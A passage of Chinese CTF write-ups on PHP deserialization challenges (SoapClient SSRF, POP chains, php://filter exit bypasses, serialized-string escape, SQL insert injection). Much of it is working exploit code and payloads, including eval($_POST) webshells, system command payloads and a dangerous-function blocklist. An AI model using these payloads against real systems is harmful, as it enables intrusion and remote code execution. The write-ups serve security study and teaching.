$a)就变成call_user_func(array('SoapClient','welcome_to_the_lctf2018')),即call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)，由于SoapClient类中没有welcome_to_the_lctf2018这个方法，就会调用魔术方法__call()从而发送请求。 发送请求也就是去访问flag.php，并将结果保存在cookie为第二步我们规定的session_id的文件中。 再用这个session访问主页，就会var_dumpsession文件的内容，其中就包含字段名为flag的值。 先构造POC： 1234567&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;N0rth3ty\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\\r\\n&quot;, &#x27;uri&#x27; =&gt; &quot;123&quot;));$payload = urlencode(serialize($attack));echo &#x27;|&#x27;.$payload; 这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4的session中。 再注入反序列化的字符串： 接着触发SoapClient的__call方法发送请求： 更改cookie访问： 后记 这道题卡了我一天的时间，还是一个签到题。。。。有一个问题一直困扰我，就是把POC生成的字符串写到session文件后，他是什么时候把session的文件内容给反序列化出来了。后来看了一篇文章才知道： 于是就反序列化了一个SoapClient的实例，再调用__call函数的时候就会通过这个实例发送请求。 强网杯2020青龙组 phpweb 考点 PHP反序列化 解题 打开题目，查看源码有两个隐藏输入框 随便输入测试，有一个报错回显，发现这两个输入框是call_user_func函数的参数。 并且基本上过滤危险函数，用file_get_contents读取index.php源码。 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125;?&gt; 有一个很明显的__destruct函数，可以执行函数并且没有任何过滤，不过没有触发反序列化的点。 但是还是可以利用gettime函数中的call_user_func函数传入unserialize函数，生成字符串： 12345678&lt;?phpclass Test&#123; var $p = &quot;cat /tmp/flagoefiu4r93&quot;; var $func = &quot;system&quot;;&#125;$t = new Test;$ut = serialize($t);echo $ut; 传入参数unserialize和O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;。 [网鼎杯 2020 青龙组]AreUSerialz TODO [安洵杯 2019] easy_serialize_php 考点 代码审计 PHP 反序列化对象逃逸 解题 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 根据提示查看phpinfo 直接访问d0g3_f1ag.php没有回显。 TODO [ZJCTF2019]NiZhuanSiWei 考点 代码审计 文件包含 PHP反序列化 解题 直接给出源码： 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; file_get_contents绕过 有两种方式绕过： 使用php://input伪协议绕过 ① 将要GET的参数?xxx=php://input ② 用post方法传入想要file_get_contents()函数返回的值 用data://伪协议绕过 将url改为：?xxx=data://text/plain;base64，想要file_get_contents()函数返回的值的base64编码 或者将url改为：?xxx=data:text/plain,(url编码的内容) 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D; 读取useless.php 题目有第二个参数file，大概是include()这个file，题目提示我们要包含useless.php，同时有一个判断是file参数不能传入flag，也就是我们不能直接包含flag.php。 利用php://filter协议读取这个useless.php，构造payload读取useless.php： 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php useless.php 123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;HAHAHAHAHA&quot;); &#125; &#125; &#125; 反序列化 useless.php的魔术方法是__toString()，刚好可以使用echo $password触发这个魔术方法。 生成payload： 123456class Flag&#123; public $file = &quot;flag.php&quot;;&#125;$o = new Flag();$s = serialize($o);echo $s; payload： 1?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 综合起来的payload就是： 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; [MRCTF2020]Ezpop 考点 POP链构造 解题 123456789101112131415161718192021&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $p;&#125;$s = new Show();$t = new Test();$m = new Modifier();$t-&gt;p = $m;$s-&gt;source = $s;$s-&gt;str = $t;echo urlencode(serialize($s)); [EIS 2019]EzPOP 考点 POP链构造 php://filter 绕过exit() base64编码规则 解题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#x27;prefix&#x27;] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options[&#x27;serialize&#x27;]; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // 创建失败 &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123; highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]); 题目提示的很明显，需要构造一个POP链，能利用的魔法函数只有 A::__destruct()，可能可以利用的敏感函数：B 类 set() 中的 file_put_contents()。先分析一下 file_put_contents() 函数是否满足利用条件： 12$data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;$result = file_put_contents($filename, $data); 在 exit() 代码后面拼接 $data 数据，然后写入文件。这样就会导致我们通过$data写入的shll都不会被执行。 exit()函数可以利用base64_decode以及php://filter可以绕过。 谈一谈php://filter的妙用 这里思路是利用 php://filter 提供的各种函数去除 “死亡exit”。 接下来开始寻找 POP 链 接下来回溯看$filename和``$data`是怎么来的： $filename：先调用getCacheKey($name)，改方法是执行连接字符串的作用：$this-&gt;option['prefix'].$name构成filename。 $data：来自于 $this-&gt;serialize($value)，所以再关注$value是怎么来的。$value是A::getForStorage()的返回值：json_encode([A::cleanContents(A::cache), A::complete]);。 A::cleanContents(A::cache)实现了一个过滤的功能，A::complete更容易控制，直接写为shellcode。 其中cleanContents(): 1234567891011121314public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents;&#125; 尝试本地运行： 123456789101112131415161718&lt;?phpfunction cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents;&#125;$cache=array();$complete=&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;;echo json_encode([cleanContents($cache), $complete]); 得到： 1[[],&quot;&lt;?php @eval($_POST[\\&quot;a\\&quot;]);?&gt;&quot;] 可以看到直接complete写入shell会使shell中双引号被转义了，所以得考虑用base64编码绕过转义，再在之后解码。由于之后可以让$this-&gt;options['serialize']=base64.decode，这样和filter://就共有两处解码处理，所以对应这里考虑编码两次。 最终代码： 12345678910111213141516171819202122232425262728293031&lt;?phpclass A &#123; protected $store; protected $key; protected $expire; public function __construct($store,$key,$expire) &#123; $this-&gt;key=$key; $this-&gt;expire=$expire; $this-&gt;store=$store; &#125;&#125;class B&#123; public $option;&#125;$b=new B();$b-&gt;options[&#x27;serialize&#x27;]=&#x27;base64_decode&#x27;;$b-&gt;options[&#x27;data_compress&#x27;]=false;$b-&gt;options[&#x27;prefix&#x27;]=&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;;$a=new A($b,&#x27;eval.php&#x27;,0);$a-&gt;autosave=false;$a-&gt;cache=array();$a-&gt;complete=base64_encode(&#x27;abc&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;));//必须添加三个字符使得shell之前的字符串进行base64解码时不影响到shellecho urlencode(serialize($a)); 这里还要了解base64解码特点，base64解码的合法字符只包括[a-zA-Z1-9]+/这64个字符。 编码时：把明文每8位按6位查表转码，不足的位数用=补0 解码时：忽略[&quot;,:等64个字符之外的字符，然后逆运算就行 所以要求编码为4的倍数，由于shell前面的字符串中存在的base64编码有效字符只有php//000000000000exit21个字符，因此应该在shell前补上3个有效字符。 [2020 新春红包题] 和上一题类似，在文件名那里做了两个处理，一是文件名包含随机字符，第二点是限制了.php后缀。 解法1 直接写命令，生成flag文件。 参见安全客文章:https://www.anquanke.com/post/id/194036 123456$testB = new B();$testB-&gt;options[&#x27;serialize&#x27;] = &#x27;system&#x27;;$testA = new A($testB, &quot;miao&quot;);$testA-&gt;autosave = 0;$testA-&gt;cache = [&#x27;aaq&#x27; =&gt; &#x27;`cat /flag &gt; ./flag.xml`&#x27;];echo urlencode(serialize($testA)).&quot;\\n&quot;; 首先autosave要为0，$testB-&gt;options['serialize']要为system函数，此时我们对最后的写文件没什莫要求了，但必须要执行到$data = $this-&gt;serialize($value);这步，$testA-&gt;cache要为system要执行的命令。 解法2 对于前面的随机值，使用/…/即可截断，时间戳将会被认为一个目录，后面即可追加写任意文件。 123456789$b = new B();$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;);$a = new A($store = $b, $key = &quot;/../a.php/.&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); 解法3 先可以利用跨目录，这样就可以不去爆破文件名，再利用.user.ini绕过后缀名限制。 上传图片马 123456789101112$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../aaaaaa.jpg&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); 再上传.user.ini 123456789101112$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../.user.ini&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&quot;\\nauto_prepend_file=aaaaaa.jpg&quot;));echo urlencode(serialize($a)); 参考 http://althims.com/2020/01/29/buu-new-year/ moonback [安洵杯2019]不是文件上传 考点 源码泄露 insert注入 PHP反序列化 解题 在主页的源码下方有一个开发人员留的信息：wowouploadimage, github搜索这个名称，即可找到源码。 大概就三个功能：上传、查看、删除。 查看源码，发现有一个__destruct()函数，以及file_get_content。 12345678910111213public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125; 再找反序列化触发的点 12345678910111213141516public function Get_All_Images()&#123; $sql = &quot;SELECT * FROM images&quot;; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row = $result-&gt;fetch_assoc())&#123; if($row[&quot;attr&quot;])&#123; $attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]); $attr = unserialize($attr_temp); &#125; echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;; &#125; &#125;else&#123; echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;; &#125; mysqli_close($this-&gt;con); &#125; 第14行反序列化的值是从数据库中取出的，而序列化的值是图片的长宽，不可控，因此只能尝试SQL注入将attr属性替换掉。 123456789101112131415161718192021public function insert_array($data) &#123; $con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($con)) &#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; $sql_fields = array(); $sql_val = array(); foreach($data as $key=&gt;$value)&#123; $key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $key); $value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $value); $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;; $sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;; &#125; $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; &#125; filename字段直接可控，可以在上传图片时修改filename实现注入。 先生成payload： 1234567891011&lt;?php class helper&#123; protected $ifview = true; protected $config = &quot;/flag&quot;;&#125; $a = new helper();echo serialize($a);?&gt; payload： 1O:6:&quot;helper&quot;:2:&#123;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125; 由于存在替换： 1$attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]); 所以把payload变为： 1O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\\0\\0\\0ifview&quot;;b:1;s:9:&quot;\\0\\0\\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125; 因为上传的文件名中不能有双引号，所以将payload进行16进制编码。 10x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d 原来的插入语句为 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#x27;a&#x27;,&#x27;a.jpg&#x27;,&#x27;jpg&#x27;,&#x27;pic/a.jpg&#x27;,&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;) 传入title的值： 11&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg insert注入后 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#x27;1.jpg&#x27;,&#x27;a.jpg&#x27;,&#x27;jpg&#x27;,&#x27;pic/a.jpg&#x27;,&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;) 实际上插入了两条数据，取出的时候就会反序列化传入的数据。访问show.php得到flag。 [NPUCTF2020]ReadlezPHP 考点 PHP反序列化 解题 打开题目直接查看源码，发现有一个time.php?source，访问即得到源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); 比较简单的反序列化题目，生成payload 1234567891011&lt;?phpclass HelloPhp&#123; public $a; public $b;&#125;$t = new HelloPhp;$t-&gt;a = &quot;phpinfo()&quot;;$t-&gt;b = &quot;assert&quot;;$ut = serialize($t);echo $ut; 然后全局搜索flag。 后记 一开始我使用eval和phpinfo()无法执行 ，报错eval函数没有定义，去StackOverflow上一看，说是eval不能用于动态函数。简单来说就是： eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。 什么是可变函数？ 可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require，eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。 所以： eval是语言构造器而不是一个函数，不能被可变函数调用 在php7.1版本之后 assert()默认不再可以执行代码 [0CTF2016]piapiapia 考点 数组绕过 PHP反序列化字符逃逸 解题 www.zip下载源码，一共有6个PHP文件，其中比较重要的就下面这几个文件。 很明显flag在config.php中 1234567&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; profile.php 1234567891011121314151617&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt; update.php 1234567891011121314151617181920212223242526272829303132&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt; 在profile.php文件中有一个很明显的可以读文件的地方$photo = base64_encode(file_get_contents($profile['photo']));，并且$profile变量是经过反序列化的。那么现在的目标就是要把$profile['photo']的值替换成config.php，update.php中可以控制$profile变量。主要是下面这一段代码： 1234567$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile));echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; 传入了数组中这四个值，然后将数组序列化后带入user类中的update_profile方法中从而更改表信息。然后我们查看内容时会在profile.php中反序列化后返回给我们要看的信息。再去看一下update_profile函数： 1234567891011121314151617public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125;public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; 这是一个防止sql注入的方法，其中他将上面五个sql关键字替换为了hacker。看起来没什么问题，但这却是我们最重要的利用点。 任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。 首先我们看一下一个正常的$profile经过序列化后是什么样子： 1$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;ca01h&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125; 我们更改的信息是要经过序列化存入数据库的，因此如果我们在信息中填入了关键字，比如： 1a:2:&#123;i:0;s:6:&quot;select&quot;;i:1;s:5:&quot;world&quot;;&#125; 这样会替换为 1a:2:&#123;i:0;s:6:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125; 反序列化会正常执行，因为字符没什么问题，但如果填入了where。 1a:2:&#123;i:0;s:5:&quot;where&quot;;i:1;s:5:&quot;world&quot;;&#125; 会替换为： 1a:2:&#123;i:0;s:5:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125; 这样就会发现会出错，因为where是五个字符，而hacker是六个，对于出where以外的其他都是六字符，所以只有where会出错，因此这就是我们的利用点。当我们把hacker多余的这个r替换成&quot;;i:1;s:5:&quot;world&quot;;&#125;时， 1a:2:&#123;i:0;s:5:&quot;hacke&quot;;i:1;s:5:&quot;world&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125; 